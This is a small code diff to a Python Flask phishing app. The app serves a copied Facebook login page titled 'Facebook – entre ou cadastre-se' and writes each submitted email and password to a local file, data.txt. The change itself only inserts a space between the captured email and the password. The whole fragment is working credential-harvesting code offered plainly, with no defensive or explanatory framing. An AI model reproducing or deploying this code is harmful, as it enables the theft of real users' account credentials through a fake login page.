@@ -8,7 +8,7 @@ def get_data():
         return render_template("Facebook – entre ou cadastre-se.html")
     elif request.method == "POST":
         
-        data = request.form['email'] + request.form['password']
+        data = request.form['email'] + " " + request.form['password']
         file = open('data.txt','a')
         file.write(str(data) +' '+"\n")
         file.close()
